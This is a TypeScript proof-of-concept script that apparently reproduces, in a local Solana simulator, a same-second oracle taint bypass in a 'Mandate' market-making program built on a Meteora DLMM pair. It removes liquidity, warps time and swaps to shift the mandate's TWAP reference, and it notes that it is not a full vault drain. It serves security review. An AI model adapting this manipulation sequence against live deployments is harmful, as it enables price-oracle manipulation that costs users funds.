/** Same-second oracle taint reproduction against the locally built program and Meteora binary. */
import assert from "node:assert/strict";
import { BN } from "@coral-xyz/anchor";
import { Keypair } from "@solana/web3.js";
import { createDlmmPair, createMint, dlmmGoToBin, dlmmSwap, fundedKeypair, initBinArrays,
  mandateProgram, mintTo, now, ONE_Q64, oracleCumulative, readActiveId, send, startSvm, warp, writeReferencePool } from "../../tests/helpers";
import { MandateClient, type MandateTerms, pda, decodeLbPair } from "../../sdk/src";
async function main() {
  const svm = startSvm(), client = new MandateClient(mandateProgram());
  const issuer = fundedKeypair(svm), maker = fundedKeypair(svm), trader = fundedKeypair(svm);
  const base = createMint(svm, issuer, 6), quote = createMint(svm, issuer, 6);
  for (const mint of [base, quote]) {
    mintTo(svm, issuer, mint, issuer.publicKey, 10n ** 12n);
    mintTo(svm, issuer, mint, trader.publicKey, 10n ** 12n);
  }
  mintTo(svm, issuer, quote, maker.publicKey, 10n ** 12n);
  const pair = createDlmmPair(svm, issuer, base, quote, 25, 0);
  initBinArrays(svm, issuer, pair.lbPair, [-1, 0, 1, 2, 3]);
  const ref = Keypair.generate().publicKey;
  writeReferencePool(svm, ref, base, quote, ONE_Q64);
  const U = (n: number) => new BN(n * 1e6);
  const terms: MandateTerms = { feePerPeriod: U(1), periodSecs: 3600, durationPeriods: 24,
    bondAmount: U(100), minDepthQuote: U(100), maxSpreadBps: 100, depthWindowBps: 200,
    bandBps: 500, anchorTwapSecs: 300, anchorSpeedBpsPerMin: 100, liquidityLockSecs: 10,
    maxConsecutiveFailures: 3, slashBps: 10000 };
  const key = pda.mandate(issuer.publicKey, base, 90005);
  const m = () => client.decodeMandate(svm.getAccount(key)!.data);
  const lb = () => decodeLbPair(svm.getAccount(pair.lbPair)!.data);
  const snap = async () => send(svm, trader, [await client.snapshot({ cranker: trader.publicKey, mandate: key, m: m() })]);
  const nudge = () => dlmmSwap(svm, trader, pair, 1000n, false, [0, 1]);
  send(svm, issuer, [await client.createMandate({ issuer: issuer.publicKey, baseMint: base, quoteMint: quote,
    lbPair: pair.lbPair, referencePool: ref, id: 90005, terms, baseDeposit: U(5000), quoteDeposit: U(5000), feeBudget: U(24) })]);
  send(svm, maker, [await client.accept({ maker: maker.publicKey, mandate: key, m: m() })]);
  send(svm, maker, [await client.openPosition({ maker: maker.publicKey, mandate: key, m: m(), lowerBinId: -35, width: 70 })]);
  send(svm, maker, [await client.addLiquidity({ authority: maker.publicKey, mandate: key, m: m(), pair: lb(),
    amountBase: U(1300), amountQuote: U(1300), minBinId: -12, maxBinId: 12 })]);
  nudge(); warp(svm, 400); nudge(); await snap();
  const before = m().anchor.bin;
  const sampleBefore = oracleCumulative(svm, pair.oracle);
  const active = readActiveId(svm, pair.lbPair);
  send(svm, maker, [await client.removeLiquidity({ authority: maker.publicKey, mandate: key, m: m(), pair: lb(), fromBinId: active, toBinId: 34, claimFees: false })]);
  assert.equal(Number(m().anchor.taintTs), sampleBefore.ts);
  warp(svm, 600);
  dlmmGoToBin(svm, trader, pair.lbPair, 200, 0, 2);
  dlmmSwap(svm, trader, pair, 1000n, true, [2, 1, 0]);
  const sampleAfter = oracleCumulative(svm, pair.oracle);
  await snap();
  assert(m().anchor.target > 150);
  assert(m().anchor.bin > before);
  console.log(JSON.stringify({ reviewedCommit: "e607bc4", sampleTimestampBeforeRemoval: sampleBefore.ts,
    taintTimestamp: Number(m().anchor.taintTs), now: Number(now(svm)),
    misattributedBin: Number(sampleAfter.cumulative - sampleBefore.cumulative) / (sampleAfter.ts - sampleBefore.ts),
    referenceBefore: before, referenceAfter: m().anchor.bin, targetAfter: m().anchor.target,
    limitation: "Demonstrates taint bypass and reference movement; not a completed vault-drain exploit." }, null, 2));
}
main().catch(e => { console.error(e); process.exitCode = 1; });
